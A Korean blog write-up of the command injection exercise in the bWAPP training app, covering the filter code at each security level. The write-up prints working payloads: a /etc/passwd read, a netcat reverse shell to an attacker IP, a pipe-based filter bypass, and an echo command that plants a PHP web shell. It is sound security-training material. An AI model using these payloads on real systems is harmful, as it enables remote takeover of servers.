---
layout: single
title: (bWAPP)Command Injection
categories: Web-vuln
tag: [os injection. bwapp, bee box, command injection, OWASP TOP 10, OWASP]
toc: true
author_profile: false
sidebar:
    nav: "counts"
---

# 검증 로직

```php
function commandi($data)
{
    switch($_COOKIE["security_level"])
    {
        case "0" :
            $data = no_check($data);
            break;
        case "1" :
            $data = commandi_check_1($data);
            break;
        case "2" :
            $data = commandi_check_2($data);
            break;
        default :
            $data = no_check($data);
            break;
    }
    return $data;
}
```

## Level - Low

> Low Level 에서는 아무런 검증이 이루어지지 않아 해당 취약점이 손쉽게 악용될 수 있다.

![그림 1-1](/assets/image/bwapp/injection/image1.png)
-  DNS lookup 기능을 수행하는 입력창이 존재
- 활성화된 버튼을 클릭하게 되면, http://www.nsa.gov 도메인에 대한 DNS Lookup이 이루어져 매칭되는 IP를 알려준다.

![그림 1-2](/assets/image/bwapp/injection/image2.png)

- 해당 능에서는 시스템 함수를 사용한다는 것을 짐작할 수 있다.
- 이 때 적절한 입력 값 검증이 이루어지지 않는다면, 시스템의 메타문자들을 이용하여 앞 명령어에 이어서 추가 명령어를 실행할 경우 RCE 취약점으로 연계가 가능하다.

```shell
www.nsa.gov; cat /etc/passwdw 
```

- 위 코드와 같이 ;(명령어 구분자)를 통해 새로운 시스템 명령어를 보내 서버측에서 실행하도록 하였다.

![그림 1-3](/assets/image/bwapp/injection/image3.png)
- 출력된 사진과 같이 성공적으로 /etc/passwd 코드를 읽어들여 브라우저상에 출력되는 걸 확인했다.
- 위와 같이 OS Injection 취약점이 존재할 경우 시스템 명령어 주입이 가능한경우 공격자 서버에서 reverse connection이 가능하다

```shell
nc -lvp 5252
```

- 공격자 PC에서 nc를 통해 포트를 열어놓은 상태에서
- cat /etc/passwd 인자 대신 nc [공격자 ip] 5252(포트) -e /bin/bash 를 인자로 주어 연결에 성공한다.

```shell
www.nsa.gov; nc 172.20.120.196 5252 -e /bin/bash
```

![그림 1-4](/assets/image/bwapp/injection/image4.png)
## Level - Medium
> Level - Medium 에서는 &, ; 메타문자가 필터링 된 걸 알 수 있다.

```php
function commandi_check_1($data)
{
    
    $input = str_replace("&", "", $data);
    $input = str_replace(";", "", $input);
    
    return $input;
```

> &와 ; 메타문자가 필터링 되었어도, | 메타문자를 통해 두번 째 인자가 시스템 명령어로 실행이 가능하다.


```shell
www.nsa.gov | nc 172.20.120.196 5252 -e /bin/bash
```

## Level - High
> Level - High 에서는 escapeshellcmd() 함수를 통해 적절하게 검증이 이루어지고 있다.

```shell
function commandi_check_2($data)
{
   
    return escapeshellcmd($data);
    
}
```
>escapeshellcmd() 함수는 PHP 함수로서, 외부 명령을 실행하기 전 입력된 문자열에 대해 이스케이프 처리를 수행한다. 이를 통해 메타문자를 이스케이프하여, 쉘 명령을 실행할 수 없도록 한다.

# Blind - Based
> Blind 기반의 OS 인젝션 파트도 필터링은 동일하게 적용되어 있으며, Blind 기반의 OS 인젝션에 대한 부분중 하나를 실습해보았다. (해당 실습에서 사용된 방식을 제외한 여러 Blind 기반의 공격기법은 다양하지만 redirect 를 통한 Blinde 기반의 공격을 실습해보았다.)

![그림 1-5](/assets/image/bwapp/injection/image5.png)
 - 사진에서 볼 수 있듯, 명령어에 대한 어떠한 결과값이 도출되지 않고 있다

 ```shell
 127.0.0.1;echo '<?php system($_GET['cmd']) ?>' > /var/www/bWAPP/shell.php
 ```

 - 입력값과 추가 시스템 명령어를 전달하였다.
- 실습대상인 bWAPP의 웹 디렉터리 내에 shell.php 파일을 생성하였고, 웹 페이지에서 해당 경로로 접근하면 웹쉘이 실행되는것을 확인했다.
![그림 1-6](/assets/image/bwapp/injection/image6.png)

